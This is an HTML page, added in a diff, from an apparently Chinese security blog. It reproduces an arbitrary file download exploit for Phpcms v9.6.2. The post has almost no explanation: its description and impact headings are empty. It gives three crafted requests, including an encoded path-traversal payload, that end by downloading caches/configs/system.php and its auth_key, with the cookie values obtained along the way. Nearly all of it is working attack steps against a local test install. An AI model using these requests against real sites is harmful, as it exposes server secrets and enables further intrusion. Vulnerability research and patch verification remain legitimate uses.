@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Phpcms v9.6.2 任意文件下载一、漏洞简介二、漏洞影响三、复现过程第一步:进行如下请求获得YDVIB_siteid的值。请求： [GET]http:&#x2F;&#x2F;127.0.0.1&#x2F;code&#x2F;phpcms_v9.6.2_UTF8&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;a&#x3D;init&amp;siteid&#x3D;1  获得： [cookie]YDVIB_siteid:75d1XCn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Phpcms v9.6.2 任意文件下载一、漏洞简介二、漏洞影响三、复现过程第一步:进行如下请求获得YDVIB_siteid的值。请求： [GET]http:&#x2F;&#x2F;127.0.0.1&#x2F;code&#x2F;phpcms_v9.6.2_UTF8&#x2F;index.php?m&#x3D;wap&amp;c&#x3D;index&amp;a&#x3D;init&amp;siteid&#x3D;1  获得： [cookie]YDVIB_siteid:75d1XCn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId28.png">
+<meta property="article:published_time" content="2022-07-08T06:26:01.731Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Phpcmsv9.6.2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId28.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Phpcms/Phpcms v9.6.2 任意文件下载" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
+  <time datetime="2022-07-08T06:26:01.731Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Phpcms-v9-6-2-任意文件下载"><a href="#Phpcms-v9-6-2-任意文件下载" class="headerlink" title="Phpcms v9.6.2 任意文件下载"></a>Phpcms v9.6.2 任意文件下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h5 id="第一步-进行如下请求获得YDVIB-siteid的值。"><a href="#第一步-进行如下请求获得YDVIB-siteid的值。" class="headerlink" title="第一步:进行如下请求获得YDVIB_siteid的值。"></a>第一步:进行如下请求获得YDVIB_siteid的值。</h5><p>请求：</p>
+<pre><code>[GET]http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1
+</code></pre>
+<p>获得：</p>
+<pre><code>[cookie]YDVIB_siteid:75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst
+</code></pre>
+<h5 id="第二步-在-POST-DATA-中的userid-flash参数的值设置为，第一步请求得到的YDVIB-siteid参数的值，并进行如下请求。"><a href="#第二步-在-POST-DATA-中的userid-flash参数的值设置为，第一步请求得到的YDVIB-siteid参数的值，并进行如下请求。" class="headerlink" title="第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。"></a>第二步:在[POST DATA] 中的userid_flash参数的值设置为，第一步请求得到的YDVIB_siteid参数的值，并进行如下请求。</h5><p>请求：</p>
+<pre><code>[GET] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;src=a%26i=1%26m=1%26catid=1%26f=./caches/configs/system.ph%253ep%2581%26modelid=1%26d=1&amp;aid=1
+
+[POST DATA] userid_flash=75d1XCnlbSh-1zi2xZ-gearAbSsmOcXypuSKXZst
+</code></pre>
+<p>获得：</p>
+<pre><code>[cookie] YDVIB_att_json:ea6fUlmiupVPoK2udMAztI7dpqUURRW1plemEGmRhGPocAvwWbcMk3BARFHzxLI4NJrV1IJQ2PaHeec790iDdhRJ9dJbhEKamgM55SwKR-F3fFmmWDOVuHnyiWg9kyMzQ2l9D_cRPQmM7P9e7ZYrESNQwjMOytrFTIhY4SFmK2Vjc3GS3g
+</code></pre>
+<h5 id="第三步-将GET请求中的a-k参数的值设置为第二步请求获得的YDVIB-att-json参数的值，并进行如下请求。"><a href="#第三步-将GET请求中的a-k参数的值设置为第二步请求获得的YDVIB-att-json参数的值，并进行如下请求。" class="headerlink" title="第三步:将GET请求中的a_k参数的值设置为第二步请求获得的YDVIB_att_json参数的值，并进行如下请求。"></a>第三步:将GET请求中的a_k参数的值设置为第二步请求获得的YDVIB_att_json参数的值，并进行如下请求。</h5><p>请求：</p>
+<pre><code>[get] http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=41f4VsAhLvN8-4L1ntgSsuga4BrvYA5zcDo2bjiYB7RI98Qzj5D5k8dqqBfo7cUNwF3TGhz1SH-vPs3lIIQJYwHeF_u2b3QVfD2HIO3Gay68TAtz2rqYhX8XIeznWrTtOI24418KZUoTEAfnY4kZNtIajW-bqHRV1djqmEc1hSAwkIYWA9CPrw
+</code></pre>
+<p>获得：</p>
+<pre><code>http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM
+</code></pre>
+<h5 id="最后点击”点击下载”的按钮进行如下请求，便可以下载-caches-configs-system-php文件，得到里面的’auth-key’"><a href="#最后点击”点击下载”的按钮进行如下请求，便可以下载-caches-configs-system-php文件，得到里面的’auth-key’" class="headerlink" title="最后点击”点击下载”的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的’auth_key’"></a>最后点击”点击下载”的按钮进行如下请求，便可以下载/caches/configs/system.php文件，得到里面的’auth_key’</h5><pre><code>http://127.0.0.1/code/phpcms_v9.6.2_UTF8/index.php?m=content&amp;c=down&amp;a=download&amp;a_k=7e9d9SFk0jOteAemg-j7IVn6Ph1JFU9FEkyDo9xeasNJDPgZsOhusc39D4KiHzydJwt2B4iLuu-l9w03UV47obM9nsnjcJxi2jbawvqfZWcY9PeL3j0MgKxAvgXL4-dbf8gGG6_EJXIOA2p9Jkl9QcM
+</code></pre>
+<p><img src="/resource/Phpcmsv9.6.2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId28.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158352.html">https://www.freebuf.com/column/158352.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qu5u00e3y8v1hxt9dt53" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.2%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Phpcms/Phpcms%20v9.6.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
